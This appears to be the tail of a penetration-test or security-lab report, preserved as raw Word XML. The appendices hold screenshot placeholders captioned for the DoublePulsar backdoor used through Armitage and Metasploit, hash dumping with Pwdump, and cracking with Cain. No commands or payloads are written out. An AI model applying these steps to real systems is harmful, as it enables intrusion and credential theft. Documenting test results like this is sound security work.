                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5040065" cy="7298585"/>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654CBB7E" wp14:editId="4BC1C24A">
            <wp:extent cx="5038725" cy="72966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4768" b="9297"/>
                    <a:stretch/>
                  </pic:blipFill>
                  <pic:spPr bwMode="auto">
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5040065" cy="7298585"/>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2BDA38BE" wp14:editId="6DBF9C79">
            <wp:extent cx="5610225" cy="714233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8620" b="6342"/>
                    <a:stretch/>
                  </pic:blipFill>
                  <pic:spPr bwMode="auto">
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5612771" cy="7145576"/>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r>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Courier New" w:hAnsiTheme="minorHAnsi" w:cs="Courier New"/>
        </w:rPr>
        <w:t>Double pulsar:</w:t>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6F58D2CD" wp14:editId="3D9BE4EE">
            <wp:extent cx="5943600" cy="77584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663" t="1773" r="1619" b="6047"/>
                    <a:stretch/>
                  </pic:blipFill>
                  <pic:spPr bwMode="auto">
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5943600" cy="7758454"/>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7C1BE442" wp14:editId="5510BBD9">
            <wp:extent cx="5943600" cy="77584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663" t="1773" r="1619" b="6047"/>
                    <a:stretch/>
                  </pic:blipFill>
                  <pic:spPr bwMode="auto">
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5943600" cy="7758454"/>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p>
    <w:p w:rsidR="0038524F" w:rsidRDefault="0038524F" w:rsidP="00BA7AE1">
      <w:pPr>
        <w:spacing w:after="1" w:line="260" w:lineRule="auto"/>
        <w:ind w:left="-5" w:right="1119"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Courier New" w:hAnsiTheme="minorHAnsi" w:cs="Courier New"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Courier New" w:hAnsiTheme="minorHAnsi" w:cs="Courier New"/>
        </w:rPr>
        <w:t xml:space="preserve">Using Armitage and </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Courier New" w:hAnsiTheme="minorHAnsi" w:cs="Courier New"/>
        </w:rPr>
        <w:t>metasploit</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Courier New" w:hAnsiTheme="minorHAnsi" w:cs="Courier New"/>
        </w:rPr>
        <w:t xml:space="preserve"> to begin using the backdoor: </w:t>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26EA1E96" wp14:editId="7EA42712">
            <wp:extent cx="5943600" cy="13340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630" t="58795" b="6342"/>
                    <a:stretch/>
                  </pic:blipFill>
                  <pic:spPr bwMode="auto">
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5943600" cy="1334033"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                    <a:extLst>
                      <a:ext uri="{53640926-AAD7-44D8-BBD7-CCE9431645EC}">
                        <a14:shadowObscured xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main"/>
                      </a:ext>
                    </a:extLst>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsid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5D6A2318" wp14:editId="4BD13519">
            <wp:extent cx="5943600" cy="41176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444" t="18648" r="26809" b="6540"/>
                    <a:stretch/>
                  </pic:blipFill>
                  <pic:spPr bwMode="auto">
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5943600" cy="4117609"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                    <a:extLst>
                      <a:ext uri="{53640926-AAD7-44D8-BBD7-CCE9431645EC}">
                        <a14:shadowObscured xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main"/>
                      </a:ext>
                    </a:extLst>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="0038524F" w:rsidRPr="0038524F" w:rsidRDefault="0038524F" w:rsidP="00BA7AE1">
      <w:pPr>
        <w:spacing w:after="1" w:line="260" w:lineRule="auto"/>
        <w:ind w:left="-5" w:right="1119"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Courier New" w:hAnsiTheme="minorHAnsi" w:cs="Courier New"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="2A80029F" wp14:editId="0BF1546C">
            <wp:extent cx="5943600" cy="41176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444" t="18648" r="26809" b="6540"/>
                    <a:stretch/>
                  </pic:blipFill>
                  <pic:spPr bwMode="auto">
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5943600" cy="4117609"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                    <a:extLst>
                      <a:ext uri="{53640926-AAD7-44D8-BBD7-CCE9431645EC}">
                        <a14:shadowObscured xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main"/>
                      </a:ext>
                    </a:extLst>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="009525A9" w:rsidRDefault="009525A9" w:rsidP="009525A9">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="578" w:hanging="578"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="9" w:name="_Toc453256712"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Appendix </w:t>
      </w:r>
      <w:bookmarkEnd w:id="9"/>
      <w:r w:rsidR="007504C1">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>C</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0043674B" w:rsidRPr="0043674B" w:rsidRDefault="0038524F" w:rsidP="0043674B">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Pwdump</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> password hashes:</w:t>
      </w:r>
      <w:r w:rsidRPr="0038524F">
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="72045B81" wp14:editId="2C3762A5">
            <wp:extent cx="4790885" cy="4743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693" r="51442" b="6838"/>
                    <a:stretch/>
                  </pic:blipFill>
                  <pic:spPr bwMode="auto">
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="4798652" cy="4751140"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                    <a:extLst>
                      <a:ext uri="{53640926-AAD7-44D8-BBD7-CCE9431645EC}">
                        <a14:shadowObscured xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main"/>
                      </a:ext>
                    </a:extLst>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="0043674B" w:rsidRDefault="0043674B" w:rsidP="0043674B">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="10" w:name="_Toc453256713"/>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="63D0144E" wp14:editId="40A7CF4D">
            <wp:extent cx="4819650" cy="493324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38" r="52404" b="6552"/>
                    <a:stretch/>
                  </pic:blipFill>
                  <pic:spPr bwMode="auto">
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="4826400" cy="4940153"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                    <a:extLst>
                      <a:ext uri="{53640926-AAD7-44D8-BBD7-CCE9431645EC}">
                        <a14:shadowObscured xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main"/>
                      </a:ext>
                    </a:extLst>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="0043674B" w:rsidRPr="0043674B" w:rsidRDefault="0043674B" w:rsidP="0043674B">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="00C88415" wp14:editId="277FDB91">
            <wp:extent cx="5672568" cy="44100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751" r="52564" b="9687"/>
                    <a:stretch/>
                  </pic:blipFill>
                  <pic:spPr bwMode="auto">
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5684148" cy="4419078"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                    <a:extLst>
                      <a:ext uri="{53640926-AAD7-44D8-BBD7-CCE9431645EC}">
                        <a14:shadowObscured xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main"/>
                      </a:ext>
                    </a:extLst>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="0043674B" w:rsidRDefault="0043674B" w:rsidP="00CD79E1">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="009525A9" w:rsidRDefault="002A7605" w:rsidP="009525A9">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="-5"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Appendix D</w:t>
      </w:r>
      <w:r w:rsidR="009525A9">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:bookmarkEnd w:id="10"/>
    </w:p>
    <w:p w:rsidR="009525A9" w:rsidRPr="002A7605" w:rsidRDefault="002A7605" w:rsidP="009525A9">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Courier New" w:hAnsiTheme="minorHAnsi" w:cs="Courier New"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002A7605">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Courier New" w:hAnsiTheme="minorHAnsi" w:cs="Courier New"/>
        </w:rPr>
        <w:t>Password hashes cracked by Cain:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00351C72" w:rsidRDefault="002A7605" w:rsidP="00351C72">
      <w:pPr>
        <w:ind w:right="919"/>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="6E3A76F9" wp14:editId="5077BF4F">
            <wp:extent cx="4076700" cy="3709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615" t="10826" r="40545" b="8547"/>
                    <a:stretch/>
                  </pic:blipFill>
                  <pic:spPr bwMode="auto">
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="4076700" cy="3709666"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                    <a:extLst>
                      <a:ext uri="{53640926-AAD7-44D8-BBD7-CCE9431645EC}">
                        <a14:shadowObscured xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main"/>
                      </a:ext>
                    </a:extLst>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="002A7605" w:rsidRDefault="002A7605" w:rsidP="00351C72">
      <w:pPr>
        <w:ind w:right="919"/>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="5F91D412" wp14:editId="74AB44CB">
            <wp:extent cx="4800600" cy="434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96" t="11397" r="41026" b="9972"/>
                    <a:stretch/>
                  </pic:blipFill>
                  <pic:spPr bwMode="auto">
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="4808669" cy="4351452"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                    <a:extLst>
                      <a:ext uri="{53640926-AAD7-44D8-BBD7-CCE9431645EC}">
                        <a14:shadowObscured xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main"/>
                      </a:ext>
                    </a:extLst>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="002A7605" w:rsidRDefault="002A7605" w:rsidP="00351C72">
      <w:pPr>
        <w:ind w:right="919"/>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="1AC9543E" wp14:editId="516F5D2D">
            <wp:extent cx="4785243" cy="4219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776" t="11397" r="40064" b="9972"/>
                    <a:stretch/>
                  </pic:blipFill>
                  <pic:spPr bwMode="auto">
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="4802535" cy="4234823"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                    <a:extLst>
                      <a:ext uri="{53640926-AAD7-44D8-BBD7-CCE9431645EC}">
                        <a14:shadowObscured xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main"/>
                      </a:ext>
                    </a:extLst>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="002A7605" w:rsidRDefault="002A7605" w:rsidP="00351C72">
      <w:pPr>
        <w:ind w:right="919"/>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="4B879977" wp14:editId="023DAB46">
            <wp:extent cx="6552652" cy="15811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417" t="68708" r="40545" b="10256"/>
                    <a:stretch/>
                  </pic:blipFill>
                  <pic:spPr bwMode="auto">
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6573922" cy="1586283"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                    <a:extLst>
                      <a:ext uri="{53640926-AAD7-44D8-BBD7-CCE9431645EC}">
                        <a14:shadowObscured xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main"/>
                      </a:ext>
                    </a:extLst>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="00351C72" w:rsidRDefault="00351C72" w:rsidP="00351C72">
      <w:pPr>
        <w:ind w:right="919"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00481CA9" w:rsidRDefault="00481CA9" w:rsidP="00481CA9">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="578" w:hanging="578"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="11" w:name="_Toc453256714"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Appendix </w:t>
      </w:r>
      <w:bookmarkEnd w:id="11"/>
      <w:r w:rsidR="00EA0256">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>E</w:t>
      </w:r>
      <w:r w:rsidR="00B05A54" w:rsidRPr="00B05A54">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w: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r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Server 1:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00EA0256" w:rsidRDefault="00EA0256" w:rsidP="00EA0256">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="34D781FE" wp14:editId="10F721DC">
            <wp:extent cx="5362575" cy="694453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1667" t="19089" r="26282" b="7121"/>
                    <a:stretch/>
                  </pic:blipFill>
                  <pic:spPr bwMode="auto">
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5373732" cy="6958981"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                    <a:extLst>
                      <a:ext uri="{53640926-AAD7-44D8-BBD7-CCE9431645EC}">
                        <a14:shadowObscured xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main"/>
                      </a:ext>
                    </a:extLst>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w: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r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Server2:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00EA0256" w:rsidRDefault="00EA0256" w:rsidP="00EA0256">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="74FDEBAC" wp14:editId="71536EDE">
            <wp:extent cx="4878901" cy="664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787" t="17949" r="26283" b="7122"/>
                    <a:stretch/>
                  </pic:blipFill>
                  <pic:spPr bwMode="auto">
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="4894360" cy="6669515"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                    <a:extLst>
                      <a:ext uri="{53640926-AAD7-44D8-BBD7-CCE9431645EC}">
                        <a14:shadowObscured xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main"/>
                      </a:ext>
                    </a:extLst>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w: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p>
    <w:p w:rsidR="00EA0256" w:rsidRDefault="00EA0256" w:rsidP="00EA0256">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Client 1:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00EA0256" w:rsidRDefault="00EA0256" w:rsidP="00EA0256">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="6047AA28" wp14:editId="40D78205">
            <wp:extent cx="4191000" cy="56611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628" t="18519" r="26763" b="7977"/>
                    <a:stretch/>
                  </pic:blipFill>
                  <pic:spPr bwMode="auto">
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="4194052" cy="5665264"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                    <a:extLst>
                      <a:ext uri="{53640926-AAD7-44D8-BBD7-CCE9431645EC}">
                        <a14:shadowObscured xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main"/>
                      </a:ext>
                    </a:extLst>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="00EA0256" w:rsidRDefault="00EA0256" w:rsidP="00EA0256">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00EA0256" w:rsidRDefault="00EA0256" w:rsidP="00EA0256">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Client 2:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00EA0256" w:rsidRPr="00EA0256" w:rsidRDefault="00EA0256" w:rsidP="00EA0256">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="5148A520" wp14:editId="60657C83">
            <wp:extent cx="4991100" cy="6263341"/>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987" t="17948" r="25321" b="9117"/>
                    <a:stretch/>
                  </pic:blipFill>
                  <pic:spPr bwMode="auto">
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="4995768" cy="6269198"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                    <a:extLst>
                      <a:ext uri="{53640926-AAD7-44D8-BBD7-CCE9431645EC}">
                        <a14:shadowObscured xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main"/>
                      </a:ext>
                    </a:extLst>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:sectPr w:rsidR="00EA0256" w:rsidRPr="00EA0256" w:rsidSect="004D7B3D">
      <w:footerReference w:type="default" r:id="rId48"/>
      <w:footerReference w:type="firs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27B2" w:rsidRDefault="008F27B2" w:rsidP="004E733D">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:separator/>
      </w:r>
    </w:p>
  </w:endnote>
  <w:endnote w:type="continuationSeparator" w:id="0">
    <w:p w:rsidR="008F27B2" w:rsidRDefault="008F27B2"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27B2" w:rsidRDefault="008F27B2">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859836"/>
      <w:docPartObj>
        <w:docPartGallery w:val="Page Numbers (Bottom of Page)"/>
        <w:docPartUnique/>
      </w:docPartObj>
    </w:sdtPr>
    <w:sdtEndPr>
      <w:rPr>
        <w:color w:val="7F7F7F" w:themeColor="background1" w:themeShade="7F"/>
        <w:spacing w:val="60"/>
      </w:rPr>
    </w:sdtEndPr>
    <w:sdtContent>
      <w:p w:rsidR="008F27B2" w:rsidRDefault="008F27B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8F27B2" w:rsidRDefault="008F27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17893"/>
      <w:docPartObj>
        <w:docPartGallery w:val="Page Numbers (Bottom of Page)"/>
        <w:docPartUnique/>
      </w:docPartObj>
    </w:sdtPr>
    <w:sdtEndPr>
      <w:rPr>
        <w:color w:val="7F7F7F" w:themeColor="background1" w:themeShade="7F"/>
        <w:spacing w:val="60"/>
      </w:rPr>
    </w:sdtEndPr>
    <w:sdtContent>
      <w:p w:rsidR="008F27B2" w:rsidRDefault="008F27B2"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507BF0" w:rsidRPr="00507BF0">
          <w:rPr>
            <w:b/>
            <w:bCs/>
            <w:noProof/>
          </w:rPr>
          <w:t>15</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:b/>
            <w:bCs/>
            <w:noProof/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:b/>
            <w:bCs/>
          </w:rPr>
          <w:t xml:space="preserve"> | </w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:color w:val="7F7F7F" w:themeColor="background1" w:themeShade="7F"/>
            <w:spacing w:val="60"/>
          </w:rPr>
          <w:t>Page</w:t>
        </w:r>
      </w:p>
    </w:sdtContent>
  </w:sdt>
  <w:p w:rsidR="008F27B2" w:rsidRDefault="008F27B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404089"/>
      <w:docPartObj>
        <w:docPartGallery w:val="Page Numbers (Bottom of Page)"/>
        <w:docPartUnique/>
      </w:docPartObj>
    </w:sdtPr>
    <w:sdtEndPr>
      <w:rPr>
        <w:color w:val="7F7F7F" w:themeColor="background1" w:themeShade="7F"/>
        <w:spacing w:val="60"/>
      </w:rPr>
    </w:sdtEndPr>
    <w:sdtContent>
      <w:p w:rsidR="008F27B2" w:rsidRDefault="008F27B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8F27B2" w:rsidRPr="00A60D20" w:rsidRDefault="008F27B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27B2" w:rsidRDefault="008F27B2" w:rsidP="004E733D">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:separator/>
      </w:r>
    </w:p>
  </w:footnote>
  <w:footnote w:type="continuationSeparator" w:id="0">
    <w:p w:rsidR="008F27B2" w:rsidRDefault="008F27B2"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8"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9"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2347DD"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="373A05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4"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9"/>
  </w:num>
  <w:num w:numId="14">
    <w:abstractNumId w:val="6"/>
  </w:num>
  <w:num w:numId="15">
    <w:abstractNumId w:val="5"/>
  </w:num>
  <w:num w:numId="16">
    <w:abstractNumId w:val="15"/>
  </w:num>
  <w:num w:numId="17">
    <w:abstractNumId w:val="11"/>
  </w:num>
  <w:num w:numId="18">
    <w:abstractNumId w:val="12"/>
  </w:num>
  <w:num w:numId="19">
    <w:abstractNumId w:val="4"/>
  </w:num>
  <w:num w:numId="20">
    <w:abstractNumId w:val="18"/>
  </w:num>
  <w:num w:numId="21">
    <w:abstractNumId w:val="14"/>
  </w:num>
  <w:num w:numId="22">
    <w:abstractNumId w:val="1"/>
  </w:num>
  <w:num w:numId="23">
    <w:abstractNumId w:val="25"/>
  </w:num>
  <w:num w:numId="24">
    <w:abstractNumId w:val="17"/>
  </w:num>
  <w:num w:numId="25">
    <w:abstractNumId w:val="24"/>
  </w:num>
  <w:num w:numId="26">
    <w:abstractNumId w:val="0"/>
  </w:num>
  <w:num w:numId="27">
